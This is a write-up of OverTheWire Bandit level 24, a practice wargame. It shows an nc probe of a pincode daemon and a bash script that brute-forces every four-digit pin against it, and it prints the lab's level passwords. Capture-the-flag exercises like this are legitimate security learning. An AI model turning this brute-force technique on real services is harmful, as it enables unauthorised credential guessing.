# Bandit 24

### Content
- **[Overview](#Overview)**
- **[Connecting](#Connecting)**
- **[Looking Around](#Looking-Around)**


## Overview

-----------------
On the OverTheWire/Bandit website, we are told how connecting to the bandit server as a specific user works.

Each user corresponds to a different level:
- Bandit0 -> Level 0
- Bandit1 -> Level 1
- ...
- Bandit33 -> Level 33

Each level is hiding a flag, which is used as the password for the following level. Meaning, one must solve `Level n` to play `Level n+1`.

We always start out connecting to the `bandit.labs.overthewire.org` server on `port 2220` for each level.
Again, the users on the server specifies the level. Each starting point is the same:

``` commandline
┌──(francis㉿ghost)-[~]
└─$ ssh bandit{level}@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit{level}@bandit.labs.overthewire.org's password: 
```

The password will always be the flag of the previous level.


## Connecting

--------------

We can establish a connection with the server via ssh, and using the password `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`:

``` commandline
┌──(francis㉿ghost)-[~]
└─$ ssh bandit24@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

bandit24@bandit.labs.overthewire.org's password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar


      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

<snip>

bandit24@bandit:~$ 
```

## Task

--------------

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 
and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 
combinations, called brute-forcing.

You do not need to create new connections each time

## Looking Around

--------------
We first start by looking around the home directory, as we have no idea what is going on. We will use the command `ls`,
which allows us to `list` the content of the current directory (or specified directory).

``` text
bandit24@bandit:~$ ls
bandit24@bandit:~$
```

Alright. After looking at the `task` we are supposed to create a brute force attack against a specific port. This is very
interesting. 

Let's first connect to `port 30002` on `localhost` manually using `nc` to figure out what's going on. 

``` commandline
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
kdh

Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.




Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
```

So, if we give the server a bunch of lines, it will give us a response for each line. This is very good. This means there
is no *cooldown* phase between attempts. We can brute force the shit out of this. 

Now, one last test. We give `nc` stdin vie the `printf` command to see what happens.


``` commandline
bandit24@bandit:/tmp/tmp.InSKmCxozg$ printf "\n\n\n\n\n\n\n" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
Fail! You did not supply enough data. Try again.
```

Alright. This is all we need to know to crack this level. 

We will create a bash scrip that iterates from `0000..9999` and appends each number to a string containing the password
of the current level: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`.

Let's create a `temp` directory via the `mktemp` command and `cd` into that directory.

``` commandline
bandit24@bandit:~$ mktemp -d
/tmp/tmp.InSKmCxozg
bandit24@bandit:~$ cd /tmp/tmp.InSKmCxozg
bandit24@bandit:/tmp/tmp.InSKmCxozg$ 
```

Let's now create the `brute.sh` file and make it executable.

``` commandline
bandit24@bandit:/tmp/tmp.InSKmCxozg$ touch brute.sh
bandit24@bandit:/tmp/tmp.InSKmCxozg$ chmod +x ./brute.sh
```
Now, we add the following code to the `brute.sh` file.

``` commandline
#! /bin/bash

for (( i=0 ; i<10000 ; i++ )) {
        pad=$(printf "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar %04d" $i)
        echo $pad >> try.txt
}

cat try.txt | nc localhost 30002 > results.txt
```

Once we have done that we can run the script.

``` commandline
bandit24@bandit:/tmp/tmp.InSKmCxozg$ ./brute.sh
bandit24@bandit:/tmp/tmp.InSKmCxozg$
```

We now need to get rid of all the lines in the file that contain the phrase "Fail!" in it. I thought that it would  be
simplest to just use the `uniq` command, as each line before the correct line will be the same and afterward too.

``` commandline
bandit24@bandit:/tmp/tmp.InSKmCxozg$ uniq results.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```

Boom we got another flag.


